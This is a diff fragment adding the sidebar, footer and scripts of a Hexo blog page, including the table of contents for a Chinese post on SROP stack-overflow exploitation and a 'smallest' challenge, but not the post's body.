+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#高级栈溢出——SROP"><span class="nav-number">1.</span> <span class="nav-text">高级栈溢出——SROP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SROP"><span class="nav-number">2.</span> <span class="nav-text">SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ucontext"><span class="nav-number">2.1.</span> <span class="nav-text">ucontext</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#syscall"><span class="nav-number">2.2.</span> <span class="nav-text">syscall</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用原理："><span class="nav-number">2.3.</span> <span class="nav-text">利用原理：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#链式利用原理："><span class="nav-number">2.4.</span> <span class="nav-text">链式利用原理：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用条件"><span class="nav-number">2.5.</span> <span class="nav-text">利用条件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#smallest"><span class="nav-number">3.</span> <span class="nav-text">smallest</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Coldshield"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Coldshield</p>
+  <div class="site-description" itemprop="description">分享一些bin学习日常的菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Coldshield</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : false,
+      appId      : 'APq34QYuAOTUtOPWMtySvyvt-gzGzoHsz',
+      appKey     : 'xRjoMerK1OFN4Lad4pyXT0Bs',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
